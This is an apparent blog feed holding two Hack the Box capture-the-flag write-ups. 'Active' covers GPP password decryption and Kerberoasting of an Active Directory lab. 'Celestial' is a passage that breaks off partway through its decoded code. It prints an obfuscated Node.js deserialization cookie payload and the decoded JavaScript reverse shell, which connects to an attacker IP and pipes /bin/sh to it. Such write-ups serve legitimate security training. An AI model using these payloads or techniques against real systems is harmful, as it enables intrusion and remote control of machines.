<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>LogistyxCat - ctf</title><link href="https://logistyxcat.github.io/" rel="alternate"></link><link href="https://logistyxcat.github.io%5Cfeeds/ctf.atom.xml" rel="self"></link><id>https://logistyxcat.github.io/</id><updated>2020-02-05T00:00:00-08:00</updated><entry><title>Active - Hack the Box</title><link href="https://logistyxcat.github.io%5Chtb-active.html" rel="alternate"></link><published>2018-12-08T00:00:00-08:00</published><updated>2020-02-05T00:00:00-08:00</updated><author><name>Riley</name></author><id>tag:logistyxcat.github.io\htb-active.html,2018-12-08:</id><summary type="html">&lt;p&gt;Guide to Active from Hack the Box, featuring a Kerberoast attack.&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Description&lt;/h2&gt;
&lt;p&gt;Active is a Windows Server 2008 R2 Active Directory Domain Controller.  The attack path features a well-loved attack, Kerberoast.&lt;/p&gt;
&lt;p&gt;Active is assigned IP 10.10.10.100.&lt;/p&gt;
&lt;h2&gt;Reconnaissance&lt;/h2&gt;
&lt;p&gt;We start every box by identifying the target and running a port scan against it.&lt;/p&gt;
&lt;h4&gt;Nmap (minus some extra Windows stuff)&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# nmap -v -sC -sV -oA nmap/active 10.10.10.100&lt;/span&gt;

PORT      STATE SERVICE       VERSION
&lt;span class="m"&gt;53&lt;/span&gt;/tcp    open  domain        Microsoft DNS &lt;span class="m"&gt;6&lt;/span&gt;.1.7600 &lt;span class="o"&gt;(&lt;/span&gt;1DB04001&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;Windows Server &lt;span class="m"&gt;2008&lt;/span&gt; R2&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt; dns-nsid: 
&lt;span class="p"&gt;|&lt;/span&gt;_  bind.version: Microsoft DNS &lt;span class="m"&gt;6&lt;/span&gt;.1.7600 &lt;span class="o"&gt;(&lt;/span&gt;1DB04001&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="m"&gt;88&lt;/span&gt;/tcp    open  kerberos-sec  Microsoft Windows Kerberos &lt;span class="o"&gt;(&lt;/span&gt;server time: &lt;span class="m"&gt;2018&lt;/span&gt;-07-29 &lt;span class="m"&gt;17&lt;/span&gt;:35:32Z&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="m"&gt;135&lt;/span&gt;/tcp   open  msrpc         Microsoft Windows RPC
&lt;span class="m"&gt;139&lt;/span&gt;/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
&lt;span class="m"&gt;389&lt;/span&gt;/tcp   open  ldap          Microsoft Windows Active Directory LDAP &lt;span class="o"&gt;(&lt;/span&gt;Domain: active.htb, Site: Default-First-Site-Name&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="m"&gt;445&lt;/span&gt;/tcp   open  microsoft-ds?
&lt;span class="m"&gt;464&lt;/span&gt;/tcp   open  kpasswd5?
&lt;span class="m"&gt;593&lt;/span&gt;/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP &lt;span class="m"&gt;1&lt;/span&gt;.0
&lt;span class="m"&gt;636&lt;/span&gt;/tcp   open  tcpwrapped
&lt;span class="m"&gt;3268&lt;/span&gt;/tcp  open  ldap          Microsoft Windows Active Directory LDAP &lt;span class="o"&gt;(&lt;/span&gt;Domain: active.htb, Site: Default-First-Site-Name&lt;span class="o"&gt;)&lt;/span&gt;

Service Info: Host: DC&lt;span class="p"&gt;;&lt;/span&gt; OS: Windows&lt;span class="p"&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows_server_2008:r2, cpe:/o:microsoft:windows

Host script results:
&lt;span class="p"&gt;|&lt;/span&gt; nbstat: NetBIOS name: DC, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &lt;span class="m"&gt;00&lt;/span&gt;:50:56:b9:11:3f &lt;span class="o"&gt;(&lt;/span&gt;VMware&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt; Names:
&lt;span class="p"&gt;|&lt;/span&gt;   DC&amp;lt;&lt;span class="m"&gt;00&lt;/span&gt;&amp;gt;               Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
&lt;span class="p"&gt;|&lt;/span&gt;   ACTIVE&amp;lt;&lt;span class="m"&gt;00&lt;/span&gt;&amp;gt;           Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
&lt;span class="p"&gt;|&lt;/span&gt;   ACTIVE&amp;lt;1c&amp;gt;           Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
&lt;span class="p"&gt;|&lt;/span&gt;   DC&amp;lt;&lt;span class="m"&gt;20&lt;/span&gt;&amp;gt;               Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
&lt;span class="p"&gt;|&lt;/span&gt;_  ACTIVE&amp;lt;1b&amp;gt;           Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Active appears to be a Windows 2008 R2 Active Directory Domain Controller for the ACTIVE.HTB domain. Since this is a Windows computer, we should see if any shares are available to us from a null session.&lt;/p&gt;
&lt;h2&gt;Getting User&lt;/h2&gt;
&lt;p&gt;One of the first things to check on any Windows server is SMB null sessions.  For this, we can use &lt;code&gt;smbmap&lt;/code&gt;.&lt;/p&gt;
&lt;h4&gt;SMBMap&lt;/h4&gt;
&lt;p&gt;&lt;img alt="smbmap-shares" src="images\ctf\htb\active\smbmap-shares.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Active does allow null sessions to connect to the Replication share. Enumerating further:&lt;/p&gt;
&lt;p&gt;&lt;img alt="smbmap-groups" src="images\ctf\htb\active\smbmap-groups.jpg"&gt;&lt;/p&gt;
&lt;p&gt;According to &lt;a href="https://adsecurity.org/?p=2288"&gt;adsecurity&lt;/a&gt;, Groups.xml is a file that is distributed via Group Policy that can (among other things) create local users, set scheduled tasks, and change the local Administrator password. It may have very useful information.&lt;/p&gt;
&lt;p&gt;It is possible to download the file using smbmap by setting the &lt;code&gt;--download&lt;/code&gt; flag followed by the full path to the file, in this case &lt;code&gt;Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;After downloading the file, we can view the contents (which I have formatted for easy reading):&lt;/p&gt;
&lt;h4&gt;Groups.xml&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;Groups&lt;/span&gt; &lt;span class="na"&gt;clsid=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;User&lt;/span&gt; &lt;span class="na"&gt;clsid=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;active.htb\SVC_TGS&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;image=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;changed=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2018-07-18 20:46:06&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;uid=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;{EF57DA28-5F69-4530-A59E-AAB58578219D}&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;Properties&lt;/span&gt; &lt;span class="na"&gt;action=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;U&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;newName=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;fullName=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;description=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;cpassword=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;changeLogon=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;0&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;noChange=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;neverExpires=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;acctDisabled=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;0&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;userName=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;active.htb\SVC_TGS&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;/User&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/Groups&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Based on the Groups and User tags, this is modifying or distributing an account named &lt;strong&gt;active.htb\SVC_TGS&lt;/strong&gt;, which is clearly a domain joined user. Under &lt;em&gt;Properties&lt;/em&gt;, the &lt;code&gt;cpassword&lt;/code&gt; tag holds a password encrypted by an AES-256 private key.&lt;/p&gt;
&lt;p&gt;This would be a problem, if &lt;a href="https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx"&gt;Microsoft hadn't released the 32-byte key&lt;/a&gt; sometime before 2012.&lt;/p&gt;
&lt;p&gt;Kali comes with the &lt;code&gt;gpp-decrypt&lt;/code&gt; utility, which is built specifically for this task. Running it on the encrypted password reveals the user account's password in plaintext.&lt;/p&gt;
&lt;p&gt;&lt;img alt="v" src="images\ctf\htb\active\gpp-decrypt.jpg"&gt;&lt;/p&gt;
&lt;p&gt;So the password for SVC_TGS is &lt;strong&gt;GPPStillStandingStrong2k18&lt;/strong&gt;. To test the credentials, we can run any utility that authenticates against AD, such as Impacket's &lt;code&gt;GetADUsers.py&lt;/code&gt; script.&lt;/p&gt;
&lt;h4&gt;GetADUsers.py&lt;/h4&gt;
&lt;p&gt;&lt;img alt="GetADUsers" src="images\ctf\htb\active\GetADUsers.jpg"&gt;&lt;/p&gt;
&lt;p&gt;The credentials we have are valid, and Administrator appears to be the only account to target at the moment. We can attempt to run &lt;code&gt;psexec.py&lt;/code&gt; (also Impacket) on the target to get a shell, but the account doesn't appear to have write access to any shares.&lt;/p&gt;
&lt;h4&gt;psexec.py (no shell)&lt;/h4&gt;
&lt;p&gt;&lt;img alt="psexec-user" src="images\ctf\htb\active\psexec-user.jpg"&gt;&lt;/p&gt;
&lt;p&gt;What we can do is access the &lt;strong&gt;Users&lt;/strong&gt; share and read from the user's home directory and get the user flag in &lt;code&gt;Users\SVC_TGS\Desktop&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="user-flag" src="images\ctf\htb\active\user-flag.jpg"&gt;&lt;/p&gt;
&lt;h2&gt;Getting Administrator&lt;/h2&gt;
&lt;p&gt;While searching for methods to escalate our privileges, it's likely that we would run Impacket's &lt;code&gt;GetUserSPNs.py&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="GetUserSPNs" src="images\ctf\htb\active\GetUserSPNs.jpg"&gt;&lt;/p&gt;
&lt;p&gt;It appears that a CIFS service is running on the Administrator account. We may be able to perform a &lt;a href="https://attack.mitre.org/techniques/T1208/"&gt;Kerberoast attack&lt;/a&gt; on the service and gain access to the Administrator account.&lt;/p&gt;
&lt;p&gt;There are plenty of excellent guides on what Kerberoasting is and how it works, so I will &lt;a href="https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf"&gt;provide&lt;/a&gt; &lt;a href="https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/"&gt;some&lt;/a&gt; &lt;a href="https://pentestlab.blog/2018/06/12/kerberoast/"&gt;resources&lt;/a&gt; and keep my own explanation brief.&lt;/p&gt;
&lt;p&gt;Since the Administrator account is running a service (CIFS) on the machine, it has a SPN set on the account. Since we possess the ability to obtain a valid Kerberos TGT ticket, we may request a Kerberos TGS service ticket for any SPN from any domain controller we can authenticate to. Parts of the TGS we obtain will be encrypted with the password hash of the service account (in this case Administrator), meaning that we can brute force the credentials offline without ever knowing the actual password hash of the account.&lt;/p&gt;
&lt;h2&gt;Sunday Dinner, aka How I Kerberoasted Your Domain and You're Gonna Like It&lt;/h2&gt;
&lt;p&gt;To perform the attack from a non-domain joined computer, the easiest method is to use &lt;code&gt;GetUserSPNs.py&lt;/code&gt; to view any &lt;s&gt;beef roasts&lt;/s&gt; SPNs we fancy (repeat image for continuity purposes).&lt;/p&gt;
&lt;p&gt;&lt;img alt="Kerberoast-stage1" src="images\ctf\htb\active\Kerberoast-stage1.jpg"&gt;&lt;/p&gt;
&lt;p&gt;If there are SPN's we like the looks of (such as that CIFS service on the Administrator account), we simply add the &lt;code&gt;-request&lt;/code&gt; flag and execute again:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Kerberoast-stage2" src="images\ctf\htb\active\Kerberoast-stage2.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Finally, take your silver ticket and throw it into your &lt;s&gt;oven&lt;/s&gt; password cracker of choice. I use hashcat.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Kerberoast-stage3" src="images\ctf\htb\active\Kerberoast-stage3.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Now that we have the Administrator account password, we can use &lt;code&gt;psexec.py&lt;/code&gt; to execute commands and obtain a shell on the target system.&lt;/p&gt;
&lt;p&gt;&lt;img alt="roasted" src="images\ctf\htb\active\roasted.jpg"&gt;&lt;/p&gt;
&lt;p&gt;This concludes the guide of Active from Hack the Box.&lt;/p&gt;</content><category term="ctf"></category><category term="ctf"></category><category term="hack the box"></category></entry><entry><title>Celestial - Hack the Box</title><link href="https://logistyxcat.github.io%5Chtb-celestial.html" rel="alternate"></link><published>2018-12-04T00:00:00-08:00</published><updated>2020-02-05T00:00:00-08:00</updated><author><name>Riley</name></author><id>tag:logistyxcat.github.io\htb-celestial.html,2018-12-04:</id><summary type="html">&lt;p&gt;Guide to Celestial from Hack the Box, featuring a Node.js deserialization attack.&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Preamble&lt;/h2&gt;
&lt;p&gt;The original writeup I did for this was some time ago. My methodology then didn't include nearly as many images, and the box has been retired since August 2018.  &lt;s&gt;If I had the option to redo this with better notes and images to create a better product here, I absolutley would.&lt;/s&gt;&lt;/p&gt;
&lt;p&gt;Edit 2020-02-05:  I will be redoing this box sometime in the future.&lt;/p&gt;
&lt;h2&gt;Description&lt;/h2&gt;
&lt;p&gt;The attack path for Celestial involves a deserialization attack against the hosted Node.js Express server, followed by some automated script hijacking.&lt;/p&gt;
&lt;p&gt;Celestial's lab IP is &lt;code&gt;10.10.10.85&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Reconnaissance&lt;/h2&gt;
&lt;p&gt;The first thing I did was perform a scan of the host to determine what services were open, finding that only HTTP on port &lt;code&gt;3000&lt;/code&gt; was available, which appeared to be a Node.js Express application.&lt;/p&gt;
&lt;p&gt;Investigating the web page, the first thing display was a 404 error, but reloading the webpage revealed a different response, with the text &lt;strong&gt;Hey Dummy, 2 + 2 = 22&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Proxying my traffic through Burp suite revealed a base64 encoded cookie, with attributes including &lt;strong&gt;username&lt;/strong&gt;, &lt;strong&gt;country&lt;/strong&gt;, &lt;strong&gt;city&lt;/strong&gt;, and &lt;strong&gt;num&lt;/strong&gt;. Some research revealed that this Node.js application may be susceptible to a deserialization attack.&lt;/p&gt;
&lt;p&gt;After some experimentation, I successfully generated a payload that would exploit the vulnerability.&lt;/p&gt;
&lt;h4&gt;Poisoned cookie, from Base64 with encoded JS shellcode&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Dummy&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;rce&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;_$$ND_FUNC$$_function (){ eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,52,46,49,48,54,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,10,32,32,32,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,10,32,32,32,32,32,32,32,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,10,32,32,32,32,125,59,10,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10)) ;\n }()&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;JS shellcode, decoded from Base10 CharCode&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;net&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;net&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;spawn&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;child_process&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;spawn&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="nx"&gt;HOST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;10.10.14.106&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="nx"&gt;PORT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;1337&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="nx"&gt;TIMEOUT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;5000&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;typeof&lt;/span&gt; &lt;span class="nb"&gt;String&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;prototype&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;contains&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;undefined&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nb"&gt;String&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;prototype&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;contains&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;it&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;indexOf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;it&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;c&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;HOST&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;PORT&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;client&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;net&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Socket&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="nx"&gt;client&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;PORT&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;HOST&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;sh&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;spawn&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/bin/sh&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,[]);&lt;/span&gt;
        &lt;span class="nx"&gt;client&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Connected!\n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="nx"&gt;client&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;pipe&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;sh&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;stdin&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="nx"&gt;sh&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;stdout&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;pipe&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;client&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="nx"&gt;sh&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;stderr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;pipe&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;client&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="nx"&gt;sh&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;on&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;exit&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;code&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;signal&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
          &lt;span class="nx"&gt;client&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;end&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Disconnected!\n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;});&lt;/span&gt;
    &lt;span class="p"&gt;});&lt;/span&gt;
    &lt;span class="nx"&gt;client&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;on&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;error&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;setTimeout&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;c&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;HOST&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;PORT&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nx"&gt;TIMEOUT&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
